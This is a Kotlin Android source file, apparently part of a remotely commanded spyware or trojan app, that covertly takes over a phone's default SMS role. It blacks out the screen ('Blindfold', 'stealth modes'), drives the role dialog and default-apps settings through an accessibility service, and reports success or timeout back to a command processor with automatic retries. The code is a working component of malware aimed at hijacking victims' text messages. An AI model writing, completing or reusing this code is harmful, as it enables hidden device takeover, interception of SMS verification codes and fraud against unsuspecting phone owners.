package com.example.myandroid

import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Settings
import android.provider.Telephony
import android.app.role.RoleManager
import android.os.Handler
import android.os.Looper

object DefaultSmsManager {
    var expectedMode: String = ""
    var isRelentlessActive: Boolean = false
    var pendingCmdId: Int = -1

    fun isDefaultSms(ctx: Context): Boolean {
        return Telephony.Sms.getDefaultSmsPackage(ctx) == ctx.packageName
    }

    fun getStoredPreviousLabel(ctx: Context): String? {
        val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        val pkg = prefs.getString("original_sms_package", null) ?: return null
        return try {
            val pm = ctx.packageManager
            pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString()
        } catch (e: Exception) { null }
    }

    fun requestDefault(ctx: Context) {
        if (isDefaultSms(ctx)) {
            isRelentlessActive = false
            expectedMode = ""
            return
        }

        // Apply Blindfold centrally for all stealth modes
        if (expectedMode == "AUTO" || expectedMode == "AUTO_NAV" || expectedMode == "RELENTLESS" || expectedMode == "SCRAPE") {
            DimmerManager.IgnitionManager.request(ctx, "SMS_GHOST")
            Handler(Looper.getMainLooper()).post {
                DimmerManager.applyDim(ctx, 0, "AUTO") // Pitch black
                
                                    Handler(Looper.getMainLooper()).postDelayed({
                        // Centralized safety fuse
                        DimmerManager.IgnitionManager.release(ctx, "SMS_GHOST")
                        if (expectedMode == "AUTO" || expectedMode == "AUTO_NAV" || expectedMode == "RELENTLESS" || expectedMode == "SCRAPE") {
                            val lastMode = expectedMode
                            expectedMode = ""
                            val diag = MyAccessibilityService.dumpScreenDiagnostic()
                            DebugLogger.log("SMS_TIMEOUT_DIAG", diag)
                            MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
                            DynamicUIManager.removeOverlay(ctx, "SMS_HIJACK_SAFETY_FUSE: $lastMode")
                            CommandProcessor.updateCommandStatus(ctx, pendingCmdId, "TIMEOUT_EXCEEDED", "Strategy: $lastMode failed to acquire default SMS role.\nScreen State:\n$diag")
                            CommandRetryManager.scheduleRetry(ctx, pendingCmdId, "SET_DEFAULT_SMS", lastMode, "30s Central Fuse")
                        }
                    }, 30000)
            }
        }

        try {
            val intent = Intent(ctx, SmsRoleActivity::class.java)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS or Intent.FLAG_ACTIVITY_NO_ANIMATION)
            ctx.startActivity(intent)
            
            // CENTRALIZED ROBUST FALLBACK
            if (expectedMode == "AUTO" || expectedMode == "RELENTLESS") {
                Handler(Looper.getMainLooper()).postDelayed({
                    if (!isDefaultSms(ctx) && (expectedMode == "AUTO" || expectedMode == "RELENTLESS")) {
                        DebugLogger.log("SMS_MGR", "Hijack timeout (10s). Triggering manual navigation fallback.")
                        expectedMode = "AUTO_NAV"
                        val i = Intent(Settings.ACTION_MANAGE_DEFAULT_APPS_SETTINGS).apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
                        }
                        ctx.startActivity(i)
                    }
                }, 10000)
            }
        } catch (e: Exception) {
            DebugLogger.log("SMS_MGR", "Failed to launch SmsRoleActivity: ${e.message}")
        }
    }
}
